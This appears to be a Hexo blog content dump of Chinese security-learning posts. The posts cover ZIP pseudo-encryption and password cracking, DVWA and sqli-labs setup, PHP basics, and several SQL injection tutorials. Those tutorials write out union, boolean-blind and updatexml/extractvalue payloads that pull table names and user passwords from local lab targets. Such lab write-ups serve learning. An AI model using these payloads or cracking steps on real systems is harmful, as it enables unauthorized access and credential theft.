文件flag.txt压缩后的数据压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50) 1F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式20 9E：最后修改文件时间66 4F：最后修改文件日期 F2 1B 0F 4A：CRC-32校验（4A0F1BF2）0E 00 00 00：压缩后尺寸 0C 00 00 00：未压缩尺寸 08 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量 50 4B 05 06：目录结束标记00 00：当前磁盘编号 00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数 5A 00 00 00：目录区尺寸大小 34 00 00 00：目录区对第一张磁盘的偏移量00 00 ：ZIP 文件注释长度 伪加密：第一行的七八位，00 00是没有加密。（从这里可以判断出是否为伪加密）第四行的十三，十四位00 00：全局方式位标记，有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密，具体什么原理，可以去官网看一下。 那么，如何辨别当前的zip是真的加密还是伪加密？ 无加密压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后） 假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00 真加密压缩源文件数据区的全局加密应当为09 00且压缩源文件目录区的全局方式位标记应当为09 00 哦，对了。kail貌似可以直接打开伪加密的文件。 知道了原理就可以解决问题了，如果是伪加密可以修改回来；但是要是真加密呐！咱们往下看。 0×02.暴力破解 说到暴力破解就要说到另外两个方法了。 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码（密码短的还好说，密码长的话可能一年半个月也破解不出来） 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上 掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少 暴力破解也可在kail里进行，软件为kali自带的fcrackzip使用步骤 fcrackzip -help找到 上传压缩包所在文件目录,在此目录下进行操作fcrackzip -b -c1 -l 1-4 -u 压缩文件 -v 对于以上方法，当然推荐一款神器AZPR爆破！字典（合适的字典可以达到事半功倍的效果）！ 掩码攻击！0×03.明文攻击 原理：明文攻击（Known plaintext attack）是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。 在网上找到一个例题，链接：这里1解压这个zip文件，会得到flag.zip和tips.txt.提示“密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！”这就尴尬了，想暴力破解？不可能！！！ 不多说拉进winhex分析一波。很明显 明文攻击 ！ 将明文tips.txt进行压缩，判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。上工具AZPR！emmmmm 密码出来了。 0×04.CRC32爆破原理：它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。CRC32则表示会产生一个32bit（8位十六进制数）的校验值。注意：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况.神器：CEC32使用方法： 1python crc32.py reverse 你的crc32密文 具体的我也解释不清。大佬文章 持续更新！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"zip知识学习","slug":"zip知识学习","permalink":"https://qidian-png.github.io/tags/zip%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}]},{"title":"搭建DVWA web渗透靶场","slug":"搭建DVWA web渗透靶场","date":"2020-04-08T07:04:05.000Z","updated":"2020-05-11T09:28:27.330Z","comments":true,"path":"2020/04/08/搭建DVWA web渗透靶场/","link":"","permalink":"https://qidian-png.github.io/2020/04/08/%E6%90%AD%E5%BB%BADVWA%20web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"## 靶场的搭建是基于phpstudy环境下，phpstudy+DVWA。 1、进入 DVWA 的官网官网 http://www.dvwa.co.uk/ 页面拉到最下面有下载按钮，也可以从GitHub上clone下来。 2、DVWA的安装与配置1、将DVWA解压到phpstudy目录下的www目录下。2、修改配置文件先将 //www/DVWA-master/configure/ 中的 configure.inc.php.disc 去掉 .disc 后缀或拷贝一份去掉后缀然后将 configure/configure.inc.php 文件中的数据库信息修改为如下图（也就是配置数据库密码）： 用户名，密码是你数据库的。 3、然后浏览器访问 http://127.0.01/DWWA/setup.php正常页面：这样直接创建就行了。 4、创建成功 5、登录靶场五选一……. 6、进入主页面下面就是靶场漏洞目录，还有很多功能，我就不一一介绍了。开始学习吧！！！ 7、报错总结成功总不是一帆风顺的，踩坑。1、如果出现 reCAPTCHA:Missing 字样：需要在 configure/configure.inc.php中配置两个量 12配置$_DVWA[ &#39;recaptcha_public_key&#39; ] &#x3D; &#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;;配置$_DVWA[ &#39;recaptcha_private_key&#39; ] &#x3D; &#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;; 然后刷新页面即可。2、数据库连接失败，会出现无法连接提示这就是前面为什么使用数据库账号和密码的原因，这样才能连接成功。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://qidian-png.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"SQL注入--整数注入","slug":"SQL注入——整数注入","date":"2020-04-07T07:04:05.000Z","updated":"2020-05-11T09:25:53.769Z","comments":true,"path":"2020/04/07/SQL注入——整数注入/","link":"","permalink":"https://qidian-png.github.io/2020/04/07/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B4%E6%95%B0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。什么是整形注入呐。点这！直接入题！！！1.先判断是否存在注入。payload: ?id=1 and 1=1 看到这里的正常回显。然后 ？id=1 and 1=2 回显错误。可以判断出是整形。 2.判断列数。 order by语句。 ?id=1 order by 1 1 2 3…..直到出现报错。可以判断出只有两列。3.爆数据库名。payload: ?id=1 and 1=2 union select 1,database() 直接出来了！3.爆表名。payload: 1?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; 出来了两个表。看到了flag的曙光。4.爆字段。payload: 1?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39; 5.爆值。payload： 1?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(flag) from sqli.flag 这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"判断注入类型","slug":"判断注入类型是字符型还是整形！！！","date":"2020-04-06T07:04:05.000Z","updated":"2020-05-20T15:36:18.450Z","comments":true,"path":"2020/04/06/判断注入类型是字符型还是整形！！！/","link":"","permalink":"https://qidian-png.github.io/2020/04/06/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%EF%BC%81%EF%BC%81%EF%BC%81/","excerpt":"","text":"前几天看到一篇文章说大部分注入都可以用整形注入和字符型注入来概括。所以我就看了看做了一些题目。（勉强获得发的发言权）简单的理解:数字型： SELECT 列 FROM 表 WHERE 数字型列=值 字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’深层次的理解：1、数字型注入当输入的参数为整形时（1 ，2， 3….），如果存在注入漏洞，可以认为是数字型注入。测试步骤：（1）加单引号，双引号（等等闭合符号）URL()：www.text.com/text.php?id=3’（判断是不是字符型注入）对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异如果满足以上三点，则可以判断该URL存在数字型注入。 2、字符型注入当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。例如数字型语句：select * from table where id =3则字符型如下：select * from table where name=’admin’因此，在构造payload时通过闭合单引号可以成功执行语句：测试步骤：（1） 加单引号：select * from table where name=’admin’’由于加单引号后变成三个单引号，则无法执行，程序会报错（需掌握php语言的一些知识）；（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；Mysql 有三种常用注释符：–+注意，这种注释符后边有一个空格 #通过#进行注释 /* */ 注释掉符号内的内容 因此，构造语句为：select * from table where name =’admin’ and 1=1–+’ 可成功执行返回结果正确；（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错如果满足以上三点，可以判断该url为字符型注入。习题持续更新。（未完待续。。。）","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"php学习--基础知识及变量（一）","slug":"php学习--基础知识及变量（一）","date":"2020-04-03T07:04:05.000Z","updated":"2020-07-31T13:01:32.222Z","comments":true,"path":"2020/04/03/php学习--基础知识及变量（一）/","link":"","permalink":"https://qidian-png.github.io/2020/04/03/php%E5%AD%A6%E4%B9%A0--%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E5%8F%98%E9%87%8F%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"PHP 是什么？PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。PHP 脚本在服务器上执行。PHP 可免费下载使用。 PHP 文件是什么？PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器PHP 文件的默认文件扩展名是 “.php” PHP 能做什么？PHP 可以生成动态页面内容PHP 可以创建、打开、读取、写入、关闭服务器上的文件PHP 可以收集表单数据PHP 可以发送和接收 cookiesPHP 可以添加、删除、修改您的数据库中的数据PHP 可以限制用户访问您的网站上的一些页面PHP 可以加密数据 基本的 PHP 语法：1、PHP 脚本以 结束，PHP 文件的默认文件扩展名是 “.php”。PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。 123456789&lt;?php&#x2F;&#x2F; 这是 PHP 单行注释&#x2F;*这是PHP 多行注释*&#x2F;?&gt; 使用var_dump(变量名)可以输出变量的类型。echo只会输出引号内的内容。2、变量1、定义：用于存储信息（数字，字符串等）的”容器”。给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。php的变量命名比C语言方便多了，使用的时候直接声明一下。类似于这样： 123$txt&#x3D;&quot;Hello world!&quot;;$x&#x3D;5;$y&#x3D;10.5; PHP 变量规则：变量以 $ 符号开始，后面跟着变量的名称变量名必须以字母或者下划线字符开始变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）变量名不能包含空格变量名是区分大小写的（$y 和 $Y 是两个不同的变量） 注意： PHP 语句和 PHP 变量都是区分大小写的。 2、unset($变量名称)函数释放指定的变量。 3、变量类型定义：指保存在该变量中的数据类型。 1）bool（布尔型）表达了true或false，即真或假。以下值被认为false，其他的值都是被认为true。布尔值false0浮点型0.0空白字符串和字符串0没有成员的数组NULL 2）int型（整形）$a=1; 3)float（浮点型,也称double） $a=1.1; 4)string(字符串) 字符串是一系列的字符，字符串可以使用单引号，双引号，定界符三种方法来定义。 单引号：指定一个简单的字持串最简单的方法是使用一对单引号‘’括起来，注意在单引号括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要反斜杠()转义。单引号字符串中出现的变量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义鋼单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串！ 问题：字符串中真正的反斜杠如何表达？ 用 // 双引号双引号中的变量会被变量值所替代，即PHP会解析双引号中的变量。双引号中的变量不能直接使用，需要用 {} ， （）括起来。 定界符&lt;&lt;&lt;之后提供一个标识符开始，然后是字符串的内容，最后是同样的标识符表示结束。注意：结束标识符后必须接 ； 标识符命名规则：字母，数字，下划线并且不能以数字开始。 同样可以添加变量但是需要用花括号括起来。 木了木了！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"SQL注入--布尔盲注","slug":"SQL注入——布尔盲注","date":"2020-03-05T07:04:05.000Z","updated":"2020-07-31T13:00:43.993Z","comments":true,"path":"2020/03/05/SQL注入——布尔盲注/","link":"","permalink":"https://qidian-png.github.io/2020/03/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"前不久又学习了sql注入的布尔盲注，现在总结一下。布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。 1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。2.第二部就是判断数据库的长度。 我们需要知道这一函数 1’ and (length(database())=8)–+，通过它来判断数据库的长度，当然=可以换成 &gt;,&lt; ,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。 3.判断数据库名。我们要使用 1’ and (ascii(substr(database(),1,1))&gt;97)–+，来一一判断数据库的ascii值。最终得到数据库的名称。在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。我们需要了解相关的函数：length()返回字符串的长度substr()截取字符串的字符 database()，返回当前数据库名 第一个1，表示截取字符串的起始位置。 第二个1，表示截取字符串长度 语句作用：判断第一个库第一个字符是什么ascii()将字符串转换成其ASCII码把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。 4.爆出表名。1?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;1 --+ 同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。 5.曝出列名。1?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1)))&gt;1 --+ 也是修改limit后面的值来爆出列名。 6.爆值。1?id&#x3D;1&#39; and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+ 同上。这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。大佬博客burp进行盲注布尔盲注小白持续更新中！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"博客美化","slug":"博客美化之网易云生成外链（对于那些因为版权原因无法生成外链的）","date":"2020-03-03T07:04:05.000Z","updated":"2020-05-11T09:35:40.772Z","comments":true,"path":"2020/03/03/博客美化之网易云生成外链（对于那些因为版权原因无法生成外链的）/","link":"","permalink":"https://qidian-png.github.io/2020/03/03/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%E4%B9%8B%E7%BD%91%E6%98%93%E4%BA%91%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%EF%BC%88%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E5%9B%A0%E4%B8%BA%E7%89%88%E6%9D%83%E5%8E%9F%E5%9B%A0%E6%97%A0%E6%B3%95%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%E7%9A%84%EF%BC%89/","excerpt":"","text":"想美化一下自己的博客，放上一些好听的背景音乐。上了网易云才发现很多音乐都是因为版权原因无法生成外链，在百度上了终于找到了解决方法。给大家分享一下： 在歌单页面，在“生成外链播放器”上右击，点击 检查 这一项。 找到生成外链播放器前面的/outchain/2/1424766691/，并复制下来 将链接修改成这样 http://music.163.com/#/outchain/2/1424766691/，并且用url框里搜索，这样就可以生成外链播放器了，添加在自己的博客中。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"其他","slug":"其他","permalink":"https://qidian-png.github.io/tags/%E5%85%B6%E4%BB%96/"}]},{"title":"sql注入练习","slug":"用sql libs 练习sql注入（—）","date":"2020-03-03T07:04:05.000Z","updated":"2020-05-20T15:40:19.709Z","comments":true,"path":"2020/03/03/用sql libs 练习sql注入（—）/","link":"","permalink":"https://qidian-png.github.io/2020/03/03/%E7%94%A8sql%20libs%20%E7%BB%83%E4%B9%A0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E2%80%94%EF%BC%89/","excerpt":"","text":"最近学习sql注入里最简单的一种——联合查询注入。现在写下来理清思路，也分享分享自己的收获。 联合查询的前提条件：页面上有显示位。 什么是显示位？在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。联合查询的过程：1、判断注入点2、判断列数3、获取所有数据库名4、获取数据库所有表名5、获取字段名6、获取字段中的数据 首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。一，判断闭合符号。常见的有:” , ‘ ,’) ,”) ,或者没有闭合符合（最危险）首先在url框里输入id=1”,回显正常。这就说明这不是闭合符号，我们再换一个。输入id=1’,出现了报错，这就说明 ‘ 是闭合符号。 二，判断列数 在order by 后面1 ，2 ，3，……直到报错。 http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 4–+ 这就知道了总共有3列。 http://localhost/sqli-labs-master/Less-1/?id=0&#39; union select 1,2,3–+ 我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。2,3的位置就是我们输入的。三，获取所有数据库名。 http://localhost/sqli-labs-master/Less-1/?id=0&#39; union select 1,database(),3–+ 这样数据库就出来了。四，获取数据库里所有表名。下面所需的名称及解释就直接用学长的了。 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。information_schema.columns包含所有表的字段table_schema 数据库名table_name 表名column_name 列名information_schema.tables包含所有库的表名table_schema 数据库名table_name 表名information_schema.schemata包含所有数据库的名schema_name 数据库名group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。————————————————版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/qq_43431158/article/details/90743320 下面直接获取数据表名。 1http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ 五，获取字段名。 1http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+ 六，获取字段中的数值。 1http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+ 注意：0x3a是区分用户名和密码的。用户名和密码都知道了，剩下的自己想吧。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"phpstduy下sql libs下载，安装教程。","slug":"phpstduy下sql libs下载，安装教程。","date":"2020-03-02T07:04:05.000Z","updated":"2020-05-11T08:58:23.940Z","comments":true,"path":"2020/03/02/phpstduy下sql libs下载，安装教程。/","link":"","permalink":"https://qidian-png.github.io/2020/03/02/phpstduy%E4%B8%8Bsql%20libs%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%E3%80%82/","excerpt":"","text":"# 1.sql libs的下载。 sql libs的源代码地址：https://github.com/Audi-1/sqli-labs ，git进自己phpstduy文件夹的www文件夹内。2.找到sql libs文件夹内的sql-connections。找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。 3.sql libs安装。浏览器里输入http://localhost/sqli-labs/会出现如图。点点击第一个进行数据库安装。出现这样的页面就是安装成功了。然后就可以闯关了。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://qidian-png.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"搭建GitHub博客的过程及一些问题！！！","slug":"搭建GitHub博客的过程及一些问题！！！","date":"2020-02-11T04:44:28.940Z","updated":"2020-05-21T13:33:52.903Z","comments":true,"path":"2020/02/11/搭建GitHub博客的过程及一些问题！！！/","link":"","permalink":"https://qidian-png.github.io/2020/02/11/%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%BF%87%E7%A8%8B%E5%8F%8A%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%EF%BC%81%EF%BC%81%EF%BC%81/","excerpt":"","text":"title: GitHub博客搭建date: 2020-03-01 15:04:05tags: 博客搭建categories: 技术photos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp ​— GitHub搭建成功有段时间了，期间自己也遇到过很多问题，换过logo，主题，头像，虽然困难很多但总有解决的办法 ，让我骄傲的分享一下搭建的过程！ 1.安装node!!!1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）3.git for Windows的安装！百度搜索并且安装就完事了!4.配置GitHub SSH！1.在你git for windows 的安装路径下的文件夹内找到 git-bash.exe，运行。2.输入ssh-keygen -t rsa -C “自己的邮箱”，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。5.hexo的安装及使用。1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm –registry=https://registry.npm.taobao.org，这个会提高下载速度。3.按照官网的使用命令教程一步步进行。4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）6.安装sublime text。1.安装后直接打开，并将自己的博客目录拖进sublime text。2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。7.hexo发布前的准备。1.去hexo官网安装插件，否则会报错哟。安装成功的标志。2.config.yml中的url更改为自己的博客站点，还有作者的名字。3.最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）4.然后先hexo g生成，再hexo d再提交，并配置博客信息。5.输入成功后会让你登录GitHub的博客。 自此博客创建成功了！！！开心呀。","categories":[],"tags":[]},{"title":"SQL注入-报错注入","slug":"SQL注入—报错注入","date":"2019-12-14T14:14:05.000Z","updated":"2020-09-20T09:33:29.431Z","comments":true,"path":"2019/12/14/SQL注入—报错注入/","link":"","permalink":"https://qidian-png.github.io/2019/12/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"本来在BUU上刷题，刷到一个叫hard SQLSQL注入题，没思路看到大师傅的wp,是SQL注入里的报错注入，虽说我也接触过报错注入，但是这道题把union过滤了，双查询报错没用了；吓得我赶紧学习了基于 xpath报错注入（extractvalue和updatexml） 先来解释一下：XPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。 XPath具体的语法我也就不说了(我不会啊😂) 报错注入就是我们在查询数据库时，故意巧妙地制造错误的语句，从而使我们想要的结果通过报错返回给我们。 先说一下updatexml()函数 12345updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。语法： updatexml（XML_document，XPath_string，new_value） xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax） 例如： select * from test where id = 1 and (updatexml(1,0x7e,3)); 由于0x7e是，不属于xpath语法格式，因此报出xpath语法错误。一般的payload：id=1’and(select updatexml(,concat(‘‘,(select语句())),1))大概理解了，我们就去实践一下 靶场：DVWA 等级为：low 找到闭合点为&#39; 构造payload1&#39; and updatexml(1,concat(0x7e,database()),1)# 数据库的名字已经在报错信息里返回了 爆一下数据库表的信息，构造payload：1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #统一成功了 爆一下users字段，构造payload：1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39;),0x7e),1) # 爆值，构造payload：1&#39; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) # 这应该时里面的账号和密码了 再说一下extractvalue()函数 这个函数的用法和updatexml()应该一样 我试了一下，都一样 爆数据库，payload：1&#39; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #爆表，payload：1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) # 爆值，payload：1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))) # 爆值，payload：1&#39; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) # 都成功了。 emmmm,报错注入就先这样吧,BUU的题还没做完🤣🤣🤣","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]}],"categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"生活","slug":"生活","permalink":"https://qidian-png.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"刷题","slug":"刷题","permalink":"https://qidian-png.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"Cypto学习","slug":"Cypto学习","permalink":"https://qidian-png.github.io/tags/Cypto%E5%AD%A6%E4%B9%A0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"XSS学习","slug":"XSS学习","permalink":"https://qidian-png.github.io/tags/XSS%E5%AD%A6%E4%B9%A0/"},{"name":"命令执行","slug":"命令执行","permalink":"https://qidian-png.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"},{"name":"Crypto学习","slug":"Crypto学习","permalink":"https://qidian-png.github.io/tags/Crypto%E5%AD%A6%E4%B9%A0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://qidian-png.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"Misc学习","slug":"Misc学习","permalink":"https://qidian-png.github.io/tags/Misc%E5%AD%A6%E4%B9%A0/"},{"name":"琐事","slug":"琐事","permalink":"https://qidian-png.github.io/tags/%E7%90%90%E4%BA%8B/"},{"name":"c++学习","slug":"c-学习","permalink":"https://qidian-png.github.io/tags/c-%E5%AD%A6%E4%B9%A0/"},{"name":"web","slug":"web","permalink":"https://qidian-png.github.io/tags/web/"},{"name":"kail","slug":"kail","permalink":"https://qidian-png.github.io/tags/kail/"},{"name":"zip知识学习","slug":"zip知识学习","permalink":"https://qidian-png.github.io/tags/zip%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"name":"靶场","slug":"靶场","permalink":"https://qidian-png.github.io/